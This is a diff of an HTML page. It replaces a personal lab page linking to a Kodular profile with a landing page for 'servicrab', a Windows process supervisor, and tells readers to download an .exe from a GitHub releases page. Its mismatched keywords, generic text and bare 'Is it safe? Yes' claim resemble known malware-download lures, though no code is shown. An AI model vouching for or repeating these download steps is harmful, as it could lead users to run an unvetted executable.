@@ -1,97 +1,50 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>RaYzZzLab</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-<style>
-  :root {
-    --bg: #0a0a0a;
-    --panel: #141414;
-    --panel-2: #101010;
-    --border: #262626;
-    --border-soft: #1c1c1c;
-    --text-hi: #f2f2ef;
-    --text-mid: #9a9a97;
-    --text-dim: #565654;
-    --white: #ffffff;
-    --mono: 'JetBrains Mono', ui-monospace, monospace;
-    --sans: 'Inter', -apple-system, sans-serif;
-  }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    background: var(--bg); color: var(--text-hi); font-family: var(--sans);
-    min-height: 100vh; display: flex; align-items: center; justify-content: center;
-    padding: 24px; position: relative; -webkit-font-smoothing: antialiased;
-  }
-  body::before {
-    content: ""; position: fixed; inset: 0; pointer-events: none;
-    background-image: radial-gradient(circle, #1e1e1c 1px, transparent 1px); background-size: 28px 28px;
-    mask-image: radial-gradient(ellipse 60% 50% at 50% 40%, #000 10%, transparent 75%);
-  }
-  .stage { width: 100%; max-width: 500px; position: relative; z-index: 1; }
-  .statusbar {
-    display: flex; align-items: center; justify-content: space-between;
-    padding: 0 4px 14px 4px; font-family: var(--mono); font-size: 11px; color: var(--text-dim); letter-spacing: .08em;
-  }
-  .id { display: flex; align-items: center; gap: 8px; color: var(--text-mid); }
-  .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--white); animation: pulse 2s infinite; }
-  @keyframes pulse {
-    0% { box-shadow: 0 0 0 0 rgba(255,255,255,.35); }
-    70% { box-shadow: 0 0 0 6px rgba(255,255,255,0); }
-    100% { box-shadow: 0 0 0 0 rgba(255,255,255,0); }
-  }
-  .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
-  .panel-header { padding: 24px; border-bottom: 1px solid var(--border-soft); background: linear-gradient(180deg, #171717 0%, #141414 100%); text-align: center; }
-  .eyebrow { font-family: var(--mono); font-size: 10px; letter-spacing: .14em; color: var(--text-dim); text-transform: uppercase; margin-bottom: 10px; }
-  h1 { font-size: 26px; font-weight: 700; letter-spacing: -.01em; }
-  .content { padding: 32px 24px; text-align: center; }
-  .badge { width: 52px; height: 52px; border: 1px solid var(--border); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; background: var(--panel-2); }
-  .badge svg { width: 22px; height: 22px; }
-  .status-text { font-size: 14px; color: var(--text-mid); line-height: 1.6; margin-bottom: 28px; }
-
-  .btn { font-family: var(--sans); font-size: 14px; font-weight: 600; padding: 12px 18px; border-radius: 4px; border: 1px solid transparent; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; gap: 8px; text-decoration: none; transition: background .12s ease, border-color .12s ease; width: 100%; }
-  .btn-primary { background: var(--white); color: #0a0a0a; }
-  .btn-primary:hover { background: #e4e4e1; }
-  .btn svg { width: 15px; height: 15px; }
-
-  footer { text-align: center; padding-top: 18px; font-family: var(--mono); font-size: 10.5px; color: var(--text-dim); }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Servicrab is a lightweight process supervisor for Windows users. Manage your local stacks and servers with ease.">
+    <title>servicrab - Manage local server processes with ease</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 0 20px; background-color: #f4f7f6;">
 
-<div class="stage">
-  <div class="statusbar">
-    <div class="id"><span class="dot"></span><span>RAYZZZLAB · HOME</span></div>
-    <div id="clock">--:--:--</div>
-  </div>
+    <h1 style="font-size: 2.5em; color: #2c3e50;">🦀 servicrab - Manage local server processes with ease</h1>
 
-  <div class="panel">
-    <div class="panel-header">
-      <div class="eyebrow">Development Lab</div>
-      <h1>RaYzZzLab</h1>
+    <div style="margin: 30px 0;">
+        <a href="https://github.com/tringu1630/servicrab/releases" style="background-color: #2c3e50; color: #ffffff; padding: 15px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download servicrab</a>
     </div>
 
-    <div class="content">
+    <p>Servicrab helps you run and monitor background programs on your computer. It acts as a supervisor, ensuring that your local services remain active while you work. If a process stops for any reason, servicrab restarts it automatically. This tool suits users who maintain homelabs or run small development stacks on Windows.</p>
 
-      <p class="status-text">Check out my profile on the Kodular Community.</p>
+    <h2 style="color: #2c3e50;">📥 How to install</h2>
+    <p>Follow these steps to set up servicrab on your Windows machine:</p>
+    <ol>
+        <li>Visit the <a href="https://github.com/tringu1630/servicrab/releases" style="color: #2980b9;">official release page</a>.</li>
+        <li>Locate the section labeled Assets.</li>
+        <li>Select the file ending in .exe for Windows.</li>
+        <li>Save the file to a folder on your computer.</li>
+    </ol>
 
-      <a class="btn btn-primary" href="https://community.kodular.io/u/rayzzz/summary" target="_blank" rel="noopener noreferrer">
-        Kodular Community
-        <svg viewBox="0 0 24 24" fill="none" stroke="#0a0a0a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
-      </a>
+    <h2 style="color: #2c3e50;">⚙️ Setting up your services</h2>
+    <p>Servicrab reads a simple configuration file to know which programs to monitor. You create a text file that lists the path to your executable files. You then point servicrab to this file when you launch the application. This ensures that every program you define stays running in the background. You do not need to check these programs manually.</p>
+
+    <h2 style="color: #2c3e50;">🛡️ Why use a process supervisor?</h2>
+    <p>Computers often run many background tasks. Sometimes these tasks crash or close without notice. A supervisor watches these tasks constantly. When a task closes, the supervisor restarts it immediately. This creates a stable environment for your web servers, databases, or automation scripts. You gain peace of mind knowing your services stay online.</p>
+
+    <h2 style="color: #2c3e50;">🖥️ System requirements</h2>
+    <p>Servicrab works on Windows 10 or Windows 11. It requires no heavy dependencies or complex installations. Because it uses the Rust programming language, it consumes very little memory. You can run it alongside your primary applications without slowing down your system.</p>
+
+    <h2 style="color: #2c3e50;">📖 Common questions</h2>
+    <p><strong>Do I need to program?</strong> No. You only need to write a simple text file with the names of the programs you want to watch.</p>
+    <p><strong>Does it run at startup?</strong> You can add servicrab to your Windows startup folder if you want it to begin managing your services as soon as you log in.</p>
+    <p><strong>Is it safe?</strong> Yes. Servicrab performs specific tasks to maintain your processes. It does not modify your operating system files or registry.</p>
+
+    <h2 style="color: #2c3e50;">🚀 Running your first process</h2>
+    <p>Open your command prompt or terminal in the folder where you saved the servicrab file. Type the name of the file followed by the path to your configuration file. Servicrab will output the status of each process it tracks. If you see a green status light, your process is live. You can minimize the window and continue your work.</p>
+
+    <div style="margin-top: 50px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 0.9em; color: #7f8c8d;">
+        <p>Keywords: cli, daemon, developer-tools, devtools, homelab, launchd, process-manager, process-supervisor, rust, systemd</p>
     </div>
-  </div>
-  <footer>Secure Local Sandbox · No External Tracking</footer>
-</div>
-
-<script>
-  const updateClock = () => { document.getElementById('clock').textContent = new Date().toLocaleTimeString('en-US', {hour12:false}); };
-  updateClock(); setInterval(updateClock, 1000);
-</script>
 
 </body>
 </html>
